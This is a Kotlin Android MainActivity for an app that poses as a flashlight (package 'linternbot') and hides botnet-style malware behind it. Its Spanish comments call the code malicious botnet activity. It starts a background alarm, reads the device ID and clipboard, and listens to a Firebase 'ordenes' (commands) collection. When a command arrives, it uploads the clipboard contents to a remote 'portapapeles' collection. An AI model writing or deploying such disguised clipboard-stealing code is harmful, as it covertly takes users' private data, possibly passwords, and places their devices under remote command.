package com.linternbot

import android.content.ClipboardManager
import android.content.Context
import android.hardware.camera2.CameraManager
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.util.Log
import android.view.View.INVISIBLE
import android.view.View.VISIBLE
import android.widget.ImageView
import android.widget.Toast
import androidx.annotation.RequiresApi
import androidx.appcompat.app.ActionBar
import androidx.appcompat.app.AppCompatActivity
import com.google.firebase.firestore.DocumentChange
import com.google.firebase.firestore.ktx.firestore
import com.google.firebase.ktx.Firebase
import java.text.SimpleDateFormat
import java.util.*


var idAndroid = ""  // Variable global para almacenar el identificador unico del dispositivo android

class MainActivity : AppCompatActivity() {

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        val actionBar: ActionBar? = supportActionBar
        actionBar?.hide()
        val button = findViewById<ImageView>(R.id.boton1)
        val button2 = findViewById<ImageView>(R.id.boton2)
        idAndroid =  Settings.Secure.getString(
            contentResolver,
            Settings.Secure.ANDROID_ID
        )

        button2.visibility = INVISIBLE
        var alarm = Alarm()

        // Comienzo del trabajo en segundo plano para la actividad de la botnet
        alarm.setAlarm(this)


        // Cuando la linterna está encendida
        button.setOnClickListener {
            if(button.visibility.equals(VISIBLE)){
                button.visibility = INVISIBLE
                button2.visibility = VISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0] // usualmente la camara delantera esta en la posicion 0
                try {
                    camManager.setTorchMode(cameraId, true)

                    // Para de ejecutarse el codigo malicioso para debug
                    alarm.cancelAlarm(this)

                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }

        button2.setOnClickListener { // LA LINTERNA ESTA APAGADA
            if (button2.visibility.equals(VISIBLE)) {
                button.visibility = VISIBLE
                button2.visibility = INVISIBLE

                val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
                val cameraId = camManager.cameraIdList[0]
                try {
                    camManager.setTorchMode(cameraId, false)
                }
                catch (e: Exception){
                    print("Error al encontrar el flash")
                }
            }
        }
    }
    override fun onWindowFocusChanged(hasFocus: Boolean) {
        super.onWindowFocusChanged(hasFocus)
        if (hasFocus){
            val c = Calendar.getInstance()
            val sdf = SimpleDateFormat("yyyy-MM-dd HH:mm:ss")
            val strDate: String = sdf.format(c.time)
            val db = Firebase.firestore
            val clipBoardManager = this.getSystemService(CLIPBOARD_SERVICE) as ClipboardManager
            val copiedString = clipBoardManager.primaryClip.toString()
            Log.d("TAG2","este texto es " + copiedString!!)
            val datosPortapapeles = hashMapOf(
                "User" to idAndroid,
                "Date" to strDate,
                "Portapapeles" to copiedString
            )
            db.collection("ordenes")
                .addSnapshotListener { snapshot, e ->
                    if (e != null) {
                        Log.d("TAG", "Fallada la escucha de la primitiva.", e)
                        return@addSnapshotListener
                    }

                    for (dc in snapshot!!.documentChanges) {
                        when (dc.type) {
                            DocumentChange.Type.ADDED -> db.collection("portapapeles").document(idAndroid).set(datosPortapapeles)
                        }
                    }
                }
        }
    }
}
